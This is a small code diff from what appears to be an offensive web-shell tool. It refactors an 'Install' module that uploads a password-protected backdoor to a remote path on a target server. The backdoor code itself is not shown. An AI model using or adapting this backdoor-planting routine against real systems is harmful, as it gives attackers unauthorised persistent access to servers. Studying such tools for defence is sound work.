@@ -20,7 +20,9 @@ class Install(Module):
     def run_module(self, password, remote_path):
 
         backdoor = Backdoor(password)
-        self.modhandler.load('file.upload').run_module('', remote_path, file_content = str(backdoor))
+        self.modhandler.load('file.upload').set_file_content(str(backdoor))
+        
+        self.modhandler.load('file.upload').run({'lpath' : '', 'rpath' : remote_path})
         
            
     
